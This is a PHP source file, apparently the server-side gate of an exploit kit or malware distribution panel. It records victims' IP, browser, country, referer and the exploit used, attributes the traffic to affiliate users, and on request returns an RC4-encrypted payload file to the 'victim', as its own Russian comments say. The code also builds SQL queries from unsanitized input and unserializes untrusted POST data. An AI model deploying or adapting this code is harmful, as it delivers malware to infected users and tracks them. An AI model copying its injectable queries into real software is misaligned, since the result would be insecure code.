<?php

function errorHandler($code, $message, $file, $line) {
	debug(array('Error'=>$code,'Message'=>$message,'In file'=>$file,'On line'=>$line));
	exit();
}

function fatalErrorShutdownHandler() {
	$last_error = error_get_last();
	if ($last_error['type'] === E_ERROR) {
	// fatal error
		errorHandler(E_ERROR, $last_error['message'], $last_error['file'], $last_error['line']);
	}
}

set_error_handler('errorHandler');
register_shutdown_function('fatalErrorShutdownHandler');


include_once('config.php');			// берем конфиг
include_once('gears/functions.php');	// подключаем функции
include_once('gears/di.php');			// подключаем класс библиотеки класов
include_once('gears/db.php');			// подключаем класс базы





// создаем подключение к базе
cdim('db','connect',$config);


// забираем из базы опции и кладем их в конфиг
$options = cdim('db','query',"SELECT * FROM options");

// кладем в конфиг все что забрали из базы (все опции)
if (isset($options)) foreach($options as $k=>$v) {
	$config['options'][$v->option_name]=$v->option_value;
}


function getUserDataFromToken($token) {
	// стоит хранить токены в базе, но мне лень, так что пройдемся по пользователям
	$users = cdim('db', 'query', "SELECT u.id as id, u.user_login as user_login, f.file_id, f.last_token, f.id as flow_id FROM `users` AS u LEFT JOIN `flows` AS f ON u.id = f.user_id");
	if (isset($users)) {
		foreach($users as $k=>$v) {
			if (md5($v->last_token.$v->id.$v->user_login)==$token) {
				return $v;
			}
		}
	} return false;
}

function rc4Encrypt($key, $pt) {
	$s = array();
	for ($i=0; $i<256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	$x;
	for ($i=0; $i<256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$ct = '';
	$y;
	for ($y=0; $y<strlen($pt); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$ct .= $pt[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $ct;
}


// забиваем данные в стату
if (isset($_POST['data'])) {

	$resData = $_POST['data'];

	$resData = base64_decode($resData);
	$resData = gzinflate($resData);

	$resData = unserialize($resData);
	

	if (!is_array($resData)) exit();

	$cc = getcountry($resData['ip']);
	$os = ua2os($resData['ua']);
	$br = parse_user_agent( $resData['ua'] ); 
	if ($br != false) {
		if ($br['browser'] == NULL) {
			$br = 'Unknown';
		} else {
			$br = $br['browser'].' '.$br['version'];
		}
	} else {
		$br = 'Unknown';
	}
	
	if (!isset($resData['token']) || empty($resData['token'])) exit('=(');
	
	$userData = getUserDataFromToken($resData['token']);
	
	if ($userData === false) exit('=((');
	
	$ref = (isset($resData['referer'])) ? $resData['referer'] : '';
	if (strlen($ref) > 0)
	  {
	  $u_arr = parse_url($ref);
	  $ref = (preg_match("/^[a-zA-Z\d-_\.]{2,65}$/", $u_arr['host'])) ? $u_arr['host'] : '';
	  unset($u_arr);
	  }

	$fillData = array(
		'ip' => $resData['ip'],
		'os' => $os,
		'br' => $br,
		'cc' => $cc,
		'ua' => $resData['ua'],
		'referer' => $ref,
		'exp' => $resData['exp'],
		'user_id' => $userData->id,
		'flow_id' => $userData->flow_id,
		'hash' => $resData['hash']
	);

	// смотрим совпадающий хеш
	$q = "SELECT * FROM `traff` WHERE `hash` = '".$resData['hash']."';";
	$res = cdim('db', 'query', $q);
	if (!isset($res[0])) {
		// хеша нет, просто пишем
		$q = "INSERT INTO `traff` VALUES (NULL, '".$fillData['ip']."', '".$fillData['os']."', '".$fillData['br']."', '".$fillData['cc']."', '".$fillData['ua']."', '".$fillData['referer']."', '".$fillData['exp']."', ".$fillData['user_id'].", ".$fillData['flow_id'].", '".$fillData['hash']."');";
		cdim('db', 'query', $q);
		exit();
	} elseif(isset($res[0]) && $resData['exp']!='') {
		// хеш есть и жертва просит бин, обновляем и отдаем файл
		$q = "UPDATE `traff` SET `exp` = '".$fillData['exp']."' WHERE `hash` = '".$fillData['hash']."';";
		cdim('db', 'query', $q);

		$file = cdim('db','query',"SELECT * FROM `files` WHERE `id` = ".$userData->file_id.";");
		if (!isset($file[0])) exit(',');
		echo rc4Encrypt($config['options']['fileKey'], $file[0]->file);

//file_put_contents('bbb.bbb', 'exp='.$fillData['exp'].'; hash='.$fillData['hash'].'; filekey='.$config['options']['fileKey']."\r\n", FILE_APPEND);
		exit();
	}



} elseif(isset($_POST['hash'])) {
	// отключили в core.php это уже не нужно все
	if (!preg_match("/a-f0-9/i", $_POST['hash'])) exit('false');
	$q = "SELECT * FROM `traff` WHERE `hash` = '".$_POST['hash']."';";
	$res = cdim('db', 'query', $q);
	if (!isset($res[0])) {
		exit('true');
	}
}





?>